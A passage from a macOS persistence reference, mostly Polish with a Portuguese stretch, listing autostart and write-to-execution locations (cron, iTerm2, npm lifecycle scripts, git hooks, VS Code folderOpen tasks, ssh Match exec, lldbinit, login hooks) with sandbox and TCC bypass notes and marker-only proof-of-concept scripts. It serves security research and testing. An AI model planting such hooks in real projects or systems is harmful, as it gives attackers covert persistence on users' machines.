Te ścieżki dotyczą starszych pakietów `.qlgenerator`; [przewodnik Apple po architekturze Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) opisuje kolejność przeszukiwania i dopasowywanie typów plików. Obecne **rozszerzenia aplikacji** Quick Look są dołączane do aplikacji i podlegają innym zasadom rejestracji i wykonywania. Sama obecność generatora nie oznacza, że zostanie wybrany dla danego typu ani że jego kod uruchomi się w samym Finderze. Ścieżkę starszego generatora sprawdzono na podstawie dokumentacji i obecności katalogu; na Macu używanym do badań nie zainstalowano ani nie załadowano żadnego generatora.

### ~~Hooki logowania/wylogowania~~

> [!CAUTION]
> To u mnie nie zadziałało — ani z LoginHook użytkownika, ani z LogoutHook roota

**Opis**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz móc wykonać coś w rodzaju `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale można ich używać do wykonywania poleceń, gdy użytkownik się loguje.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Aby to usunąć:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Ten dotyczący użytkownika root jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Znajdziesz tu lokalizacje autostartu przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **liczenie na niezbyt typowe warunki**, takie jak zainstalowane określone **programy, „nietypowe” działania użytkownika** lub środowiska.

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak móc wykonać plik binarny `crontab`
  - Lub być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`**
  - Bezpośredni zapis wymaga uprawnień root. Uprawnienia root nie są wymagane, jeśli możesz wykonać `crontab <file>`
  - **Wyzwalacz**: Harmonogram w zainstalowanym crontabie. `at` i `periodic` to opisane poniżej odrębne mechanizmy.

#### Opis i wykorzystanie

Wyświetl zadania cron **bieżącego użytkownika** za pomocą:

```bash
crontab -l
```

plist launchd demona cron systemu zawiera wpis `QueueDirectories` dla `/usr/lib/cron/tabs`; tam przechowywane są zainstalowane crontaby użytkowników. Do sprawdzenia crontabów innych użytkowników wymagane są uprawnienia root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Na jednorazowym koncie można zainstalować wpis cron użytkownika zawierający wyłącznie znacznik za pomocą `crontab`, a następnie usunąć go po zaobserwowaniu. Uruchomienie `crontab <file>` **zastępuje cały istniejący crontab konta**, więc jeśli konto nie jest jednorazowe, zapisz jego crontab i przywróć go po zakończeniu:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 miał już przyznane uprawnienia TCC

#### Lokalizacje

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Wyzwalacz**: Uruchom iTerm2 z kwalifikującym się skryptem Python API w tym folderze
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Wyzwalacz**: Uruchom iTerm2; hook startowy AppleScript jest opisany osobno
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Wyzwalacz**: Utwórz sesję z profilem, którego polecenie lub tekst początkowy uruchamia payload

#### Opis i wykorzystanie

[Obecny przewodnik iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) opisuje automatycznie uruchamiane skrypty **Python** w `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Nie potwierdza, że dowolny wykonywalny plik `.sh` w tym folderze zostanie uruchomiony. Na koncie tymczasowym zapisz ten plik jako `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Aktualny przewodnik AppleScript dla iTerm2](https://iterm2.com/documentation-scripting.html) osobno opisuje `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, z zapasową starszą ścieżką `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, używaną, gdy nowy folder nie istnieje. Skrypt AppleScript zawierający wyłącznie znacznik wygląda tak:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Te przykłady skryptów sprawdzono z dokumentacją iTerm2, ale nie uruchamiano ich w aktywnej sesji pulpitu. Po przetestowaniu na koncie tymczasowym usuń skrypt testowy oraz odpowiednio `/tmp/ht-iterm-autolaunch-marker` lub `/tmp/iterm2-autolaunchscpt`.

Preferencje iTerm2 w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą określać polecenie profilu lub początkowy tekst. Ten drugi jest wpisywany w sesji; jego wykonanie zależy od tego, czy interpretuje go powłoka. [Dokumentacja profili iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) opisuje polecenie uruchamiane po utworzeniu nowej sesji z danym profilem.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Polecenie jest też widoczne w preferencjach:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Na potrzeby bezpiecznej oceny sprawdź wybrany profil w ustawieniach iTerm2 lub odczytaj kopię jego pliku preferencji. Zmiana `Initial Text` w aktywnym profilu wpłynęłaby na sesje użytkownika, dlatego na Macu użytym do badań nie zmieniono żadnych preferencji.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - xbar musi być jednak zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Prosi o uprawnienia Accessibility

#### Lokalizacja

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Wyzwalacz**: Uruchomienie xbar

#### Opis

Jeśli zainstalowany jest popularny program [**xbar**](https://github.com/matryer/xbar), można napisać skrypt powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Opis**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak zainstalowanego Hammerspoon
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Accessibility

#### Lokalizacja

- **`~/.hammerspoon/init.lua`**
  - **Wyzwalacz**: Po uruchomieniu Hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) to platforma automatyzacji dla **macOS**, wykorzystująca **język skryptowy LUA**. Co istotne, obsługuje integrację pełnego kodu AppleScript oraz wykonywanie skryptów powłoki, co znacznie rozszerza jej możliwości skryptowe.<sup>[[13]](#references)</sup>

Aplikacja szuka pojedynczego pliku `~/.hammerspoon/init.lua`, a po uruchomieniu wykonuje zawarty w nim skrypt.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool musi być jednak zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Automation-Shortcuts i Accessibility

#### Lokalizacja

- Plik skryptu **już wskazany** przez włączony preset BetterTouchTool albo konfiguracja tego presetu w `~/Library/Application Support/BetterTouchTool/`. Dokładna ścieżka skryptu zależy od konfiguracji presetu.

[Dokumentacja akcji BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) opisuje akcje skryptów powłoki i poleceń działających w tle. Skonfigurowane zdarzenie z klawiatury, myszy, touchpada, widgetu lub inne musi wystąpić, gdy odpowiedni preset jest aktywny; [przewodnik konfiguracji wyzwalaczy](https://docs.folivora.ai/docs/configuration/new-trigger/) pokazuje, jak je powiązać. Losowy plik w katalogu application-support nie jest wyzwalaczem. Skonfigurowana akcja, która ładuje zewnętrzny, zapisywalny skrypt, to bardziej ograniczony cel typu write-to-execution. Kod działa na koncie użytkownika BetterTouchTool, z uwzględnieniem faktycznie przyznanych uprawnień macOS. BetterTouchTool nie było zainstalowane w `/Applications` na Macu użytym do badań, więc lokalnie nie zmieniono ani nie uruchomiono żadnego presetu.

### Alfred

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Alfred musi być jednak zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Automation, Accessibility, a nawet Full-Disk access

#### Lokalizacja

- Skrypt lub plik **już wskazany** przez zainstalowany workflow Alfreda albo ten workflow w skonfigurowanym przez użytkownika katalogu `Alfred.alfredpreferences`. Katalog preferencji może być synchronizowany i nie ma jednej, uniwersalnej ścieżki.

[Przewodnik po workflow Alfreda](https://www.alfredapp.com/help/workflows/) opisuje wymóg posiadania Powerpacka i instalację za pomocą interfejsu aplikacji. Musi zadziałać hotkey, keyword lub inny skonfigurowany wyzwalacz zainstalowanego workflow; [przykład użycia hotkeya w Alfredzie](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) pokazuje akcję skryptu. [Dokumentacja zmiennych środowiskowych Alfreda](https://www.alfredapp.com/help/workflows/script-environment-variables/) udostępnia skonfigurowaną ścieżkę preferencji jako `alfred_preferences`. Umieszczenie niezarejestrowanego pliku workflow w dowolnym katalogu nie dowodzi, że zostanie on zainstalowany lub uruchomiony. Kod działa jako zalogowany użytkownik Alfreda, z uwzględnieniem faktycznie przyznanych uprawnień macOS. Alfred nie był zainstalowany w `/Applications` na Macu użytym do badań, dlatego tę ścieżkę oceniono wyłącznie na podstawie dokumentacji.

### Raycast Script Commands i odświeżanie rozszerzeń

- **Cel zapisu:** Wykonywalny skrypt w katalogu **już dodanym** w Raycast Settings → Script Commands. Raycast nie skanuje dowolnego, nowo utworzonego katalogu. [Przewodnik Raycast po Script Commands](https://manual.raycast.com/script-commands) opisuje rejestrację katalogu.
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia zindeksowane polecenie, wywołuje je skonfigurowany hotkey lub fallback, albo Raycast odświeża skrypt `inline` zgodnie z ustawionym dla niego `@raycast.refreshTime`. Skrypt działa za pośrednictwem interpretera jako zalogowany użytkownik Raycasta. [Dokumentacja metadanych projektu](https://github.com/raycast/script-commands#metadata) ogranicza automatyczne odświeżanie do poleceń inline, a [manifest rozszerzeń Raycasta](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) osobno obsługuje wartość `interval` dla zainstalowanych poleceń rozszerzeń `no-view` lub `menu-bar`. Samo dodanie zwykłego polecenia skryptowego nie powoduje zaplanowania jego uruchomienia.

Dla tymczasowego konta z zarejestrowanym katalogiem skryptów przykładowy skrypt inline, który tworzy wyłącznie znacznik, wygląda następująco:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Salve isso no diretório registrado, torne-o executável e deixe o Raycast atualizá-lo. Em seguida, remova esse arquivo e `/tmp/ht-raycast-refresh-marker`. O Raycast não foi encontrado com seu nome habitual em `/Applications` no Mac de pesquisa; portanto, isso está documentado, mas não foi executado localmente. As permissões de Acessibilidade, Automação e acesso a arquivos continuam sujeitas aos avisos de permissão do macOS.

### Tarefas automáticas de workspace do Visual Studio Code

- **Destino da gravação:** `.vscode/tasks.json` dentro de um workspace que o usuário abrirá.
- **Gatilho:** Abrir esse workspace no VS Code, mas somente se a pasta for confiável **e** as tarefas automáticas tiverem sido permitidas. Um workspace não confiável nunca executa tarefas automáticas; a configuração padrão solicita autorização ao usuário antes da primeira execução automática. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) e [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) descrevem ambos os requisitos.
- **Identidade de execução:** A conta do usuário do VS Code, por meio do processo de tarefa configurado. Essa execução é específica do aplicativo, não é persistência no login.

Em um **workspace novo e descartável**, coloque esta tarefa que cria apenas um marcador em `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Po otwarciu zaufanego workspace i zezwoleniu na automatyczne zadania sprawdź, czy istnieje `.autostart-task-ran`. Usuń wpis zadania i znacznik, aby posprzątać. **Zostało to zweryfikowane na podstawie dokumentacji Microsoftu i zainstalowanego pakietu VS Code 1.139.1; nie uruchomiono tego w aktywnej sesji pulpitu.**

### Hosty native messaging Chrome

- **Ścieżka zapisu:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla bieżącego użytkownika lub `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla wszystkich użytkowników (wymagane uprawnienia administratora do zapisu). Chromium i Chrome for Testing korzystają z różnych katalogów; zobacz [aktualną tabelę ścieżek Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Wyzwalacz:** Zainstalowane rozszerzenie Chrome z uprawnieniem `nativeMessaging` wywołuje `chrome.runtime.connectNative()` lub `chrome.runtime.sendNativeMessage()` z dokładną nazwą hosta z manifestu. Chrome uruchamia wtedy plik wykonywalny hosta. Samo otwarcie Chrome nie uruchamia dowolnego nowego hosta natywnego; utworzenie manifestu bez rozszerzenia, które go wywołuje, nic nie daje. [Przewodnik Chrome dotyczący native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) opisuje ten handshake.
- **Tożsamość procesu:** konto użytkownika Chrome. Manifest musi podawać bezwzględną ścieżkę do pliku wykonywalnego i jawnie zezwalać na origin wywołującego rozszerzenia.

W tymczasowym profilu przeglądarki z testowym rozszerzeniem poniższa para plików demonstruje powiązanie zapisu z wykonaniem. Nazwa pliku manifestu musi odpowiadać jego polu `name`, a `TEST_EXTENSION_ID` należy zastąpić rzeczywistym identyfikatorem tego rozszerzenia:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Zapisz ten JSON jako `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Wykonywalny plik zawierający wyłącznie marker, wskazany przez `path` w manifeście, może zawierać:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Po tym, jak testowe rozszerzenie wywoła `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` z service worker lub strony rozszerzenia, znacznik potwierdzi uruchomienie hosta. Ten minimalny host nie implementuje protokołu odpowiedzi Chrome z prefiksem długości, więc po zapisaniu znacznika rozszerzenie może zgłosić błąd komunikacji. Usuń testowy manifest, hosta i znacznik, aby posprzątać. W macOS 26.5.2 aplikacja Chrome i oba katalogi manifestów były obecne; **aktywny profil Chrome nie został zmodyfikowany ani użyty do testów**.

### Polecenia zdarzeń klawiszy Karabiner-Elements

- **Cel zapisu:** `~/.config/karabiner/karabiner.json` na koncie, na którym Karabiner-Elements jest zainstalowany i uruchomiony. [Przewodnik Karabiner dotyczący lokalizacji pliku](https://karabiner-elements.pqrs.org/docs/json/location/) informuje, że aplikacja obserwuje ten plik i wczytuje go ponownie po zapisaniu. Pliki JSON w `assets/complex_modifications` to tylko presety do zaimportowania; samo zapisanie tam pliku nie aktywuje reguły.
- **Wyzwalacz:** Skonfigurowane zdarzenie klawisza po aktywowaniu reguły. [Dokumentacja `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) opisuje wykonywanie poleceń. Nie jest to wykonanie kodu przy logowaniu ani przy każdym zapisie pliku.
- **Tożsamość wykonania:** Zalogowany użytkownik, na którego koncie działa proces użytkownika Karabiner. Przyznane mu uprawnienia i dostęp TCC zależą od aplikacji i jej wersji.

Na jednorazowym koncie testowym dodaj ten obiekt reguły do tablicy `complex_modifications.rules` wybranego profilu w `karabiner.json`, zachowując resztę profilu. Naciśnij F18, aby utworzyć nieszkodliwy znacznik, a następnie usuń tę regułę i znacznik. Wybór F18 pozwala uniknąć zastąpienia zwykłego klawisza do pisania:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements nie był zainstalowany w `/Applications` na maszynie testowej z macOS 26.5.2, dlatego jest to PoC oparty na dokumentacji, a nie wynik lokalnego uruchomienia.

### Git hooks w lokalnym repozytorium

- **Cel zapisu:** Wykonywalny hook, taki jak `<repo>/.git/hooks/post-checkout`. Jeśli wcześniej ustawiono `core.hooksPath`, użyj zamiast tego skonfigurowanego katalogu. Hook zapisany jako zwykły śledzony plik źródłowy nie jest automatycznie instalowany w sklonowanym repozytorium.
- **Wyzwalacz:** Odpowiednia operacja Git. Na przykład `post-checkout` uruchamia się po `git checkout` lub `git switch`, a także po sklonowaniu repozytorium lub utworzeniu worktree. [Dokumentacja hooków Git](https://git-scm.com/docs/githooks) wymienia zdarzenia i wymóg ustawienia bitu wykonywalności; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) zmienia katalog używany do wyszukiwania hooków.
- **Tożsamość wykonania:** Konto uruchamiające Git. Hook może zostać wykonany tylko wtedy, gdy efektywny katalog hooków repozytorium jest zapisywalny przez użytkownika, a później wykona on odpowiednią operację Git.

Ten PoC zapisujący wyłącznie znacznik tworzy całkowicie tymczasowe repozytorium, instaluje jeden hook i przełącza gałąź. Został pomyślnie uruchomiony z Apple Git 2.50.1 w macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Skrypty cyklu życia npm w projekcie

- **Cel zapisu:** Mapa `scripts` w zapisywalnym pliku `package.json` projektu albo w pakiecie zainstalowanej zależności, którego skrypt cyklu życia uruchomi użytkownik. To punkt zaczepienia w procesie programistycznym, a nie wykonywanie kodu przy otwieraniu katalogu.
- **Wyzwalacz i tożsamość:** Późniejsze `npm install` lub `npm ci`, jeśli skrypty cyklu życia są dozwolone, uruchamiają `preinstall`, `install` i `postinstall` jako użytkownik wywołujący npm. Zwykłe `npm run <name>` uruchamia również pasujące skrypty `pre<name>` i `post<name>`. [Dokumentacja cyklu życia npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) zawiera listę zdarzeń; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) może wyłączyć skrypty cyklu życia instalacji. Wersja i ustawienia zasad mogą wpływać na to, co jest dozwolone, dlatego sprawdź wersję npm w środowisku docelowym.

Ten PoC, który jedynie tworzy znacznik, uruchomiono lokalnym npm w pustym, tymczasowym katalogu. Nie pobiera zależności ani nie zmienia projektu użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Różni się to od plików startowych interpretera Python: npm musi wykonać odpowiednią akcję instalacji lub uruchomienia, podczas gdy kod `site` w Pythonie może zostać załadowany przy zwykłym uruchomieniu interpretera. Ogólne cele `Makefile` i definicje zadań kompilacji również wymagają, aby użytkownik lub wcześniej skonfigurowane narzędzie wywołało dany cel; nie są odrębnymi ścieżkami automatycznego uruchamiania systemu operacyjnego.

### Konfiguracja startowa Vim

- **Cel zapisu:** `~/.vimrc` użytkownika, który uruchomi Vim (lub inny plik startowy wybrany zgodnie z kolejnością inicjalizacji Vim). [Dokumentacja startowa Vim](https://vimhelp.org/starting.txt.html) opisuje ten plik oraz zmienne nadpisujące `VIMINIT`/`EXINIT`.
- **Wyzwalacz:** Kolejne zwykłe uruchomienie Vim, które wczytuje tę konfigurację. Opcja Vim `-u NONE` pomija vimrc użytkownika. Jest to wykonywanie specyficzne dla edytora, a nie wyzwalane logowaniem do systemu operacyjnego.
- **Tożsamość wykonania:** konto użytkownika Vim.

Poniższy odizolowany PoC uruchomiono w `/usr/bin/vim` systemu macOS; nie zapisuje on żadnych rzeczywistych preferencji Vim ani otwartych dokumentów:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ma osobną ścieżkę konfiguracji użytkownika: `$XDG_CONFIG_HOME/nvim/init.lua` lub `init.vim`. Zgodnie z [dokumentacją uruchamiania](https://neovim.io/doc/user/starting/) ładuje też skrypty z katalogów `plugin/` w ścieżkach runtime. Neovim nie był zainstalowany na maszynie testowej z macOS 26.5.2, więc ten wariant nie został tam uruchomiony.

### Polecenia konfiguracji klienta SSH

- **Plik docelowy:** `~/.ssh/config` lub inny plik, który jest już dołączany. To plik konfiguracji **klienta**, odrębny od opisanego poniżej pliku `~/.ssh/rc` po stronie serwera.
- **Wyzwalacz:** Pasujące wywołanie `ssh`. `Match exec` uruchamia lokalne polecenie podczas odczytywania konfiguracji przez klienta, nawet w przypadku `ssh -G`, które wyświetla konfigurację bez nawiązywania połączenia. `ProxyCommand` uruchamia się, gdy klient przygotowuje pasujące połączenie. `LocalCommand` uruchamia się dopiero po pomyślnym nawiązaniu połączenia i wymaga `PermitLocalCommand yes` (domyślnie ustawione jest `no`). Te mechanizmy różnią się momentem uruchomienia i wymaganiami; samo zapisanie pliku ich nie uruchamia. Zobacz źródłową dokumentację [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Tożsamość wykonania:** Lokalny użytkownik uruchamiający `ssh`. Wymagane są pasujący host, odpowiedni plik konfiguracji i, jeśli potrzeba, połączenie. `ssh -F` może wskazać inny plik konfiguracji.

Ten PoC używający wyłącznie znacznika uruchomiono za pomocą klienta SSH firmy Apple w systemie macOS 26.5.2. `-G` sprawdza działanie `Match exec` bez nawiązywania połączenia sieciowego ani odczytywania rzeczywistej konfiguracji SSH użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Pliki inicjalizacyjne debuggera

- **Cel zapisu:** `~/.lldbinit` lub plik aplikacji o wyższym priorytecie, taki jak `~/.lldbinit-lldb`. LLDB odczytuje jeden plik podczas uruchamiania debuggera. Plik `.lldbinit` w bieżącym katalogu **nie** jest domyślnie wykonywany; użytkownik musi włączyć `target.load-cwd-lldbinit` lub przekazać `--local-lldbinit`. Zobacz [podręcznik LLDB](https://lldb.llvm.org/man/lldb.html).
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia LLDB bez `--no-lldbinit`; polecenia są wykonywane jako ten użytkownik. Samo otwarcie projektu nie oznacza, że zostanie uruchomiony plik `.lldbinit` projektu.

Poniższy test zawierający wyłącznie znacznik przeprowadzono w LLDB na macOS 26.5.2, z odizolowanym katalogiem domowym i katalogiem roboczym:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB** dokumentacja [upstream dotycząca uruchamiania](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) wymienia `$HOME/Library/Preferences/gdb/gdbinit`, a następnie `~/.gdbinit` w systemie macOS. Plik `.gdbinit` w bieżącym katalogu podlega ustawieniu [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), a opcje `-nx`/`-nh` pomijają pliki inicjalizacyjne. GDB nie był zainstalowany na testowym Macu, więc ten wariant nie został lokalnie uruchomiony.

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak włączenia i używania ssh
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Użycie SSH w celu uzyskania dostępu FDA

#### Lokalizacja

- **`~/.ssh/rc`**
  - **Wyzwalacz**: Logowanie przez ssh
- **`/etc/ssh/sshrc`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Logowanie przez ssh

> [!CAUTION]
> Włączenie ssh wymaga Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i wykorzystanie

Domyślnie, o ile w pliku `/etc/ssh/sshd_config` nie ustawiono `PermitUserRC no`, po **zalogowaniu użytkownika przez SSH** zostaną wykonane skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementy logowania**

Opis: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak uruchomienia `osascript` z argumentami
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **Zarejestrowana aplikacja pomocnicza elementu logowania:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (typowa lokalizacja w pakiecie).
  - **Wyzwalacz:** Rejestracja może natychmiast uruchomić aplikację pomocniczą; będzie ona uruchamiana ponownie przy kolejnych logowaniach użytkownika, zależnie od zatwierdzenia.
- **Zarejestrowany agent/daemon dołączony do pakietu:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` lub `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Wyzwalacz:** Zatwierdzony agent może uruchomić się podczas rejestracji i przy kolejnych logowaniach; zatwierdzony daemon uruchamia się podczas rozruchu. Daemon wymaga zatwierdzenia przez administratora.

#### Opis

